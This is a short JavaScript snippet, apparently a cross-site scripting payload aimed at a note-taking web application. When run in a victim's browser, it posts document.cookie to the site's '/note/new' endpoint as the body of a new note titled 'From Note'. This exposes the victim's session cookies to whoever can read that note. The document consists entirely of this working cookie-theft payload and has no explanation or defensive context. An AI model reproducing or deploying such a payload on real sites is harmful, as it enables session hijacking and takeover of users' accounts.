(function run() {
	$.post('/note/new', {title:'From Note', content:document.cookie, submit:'save'});
})();
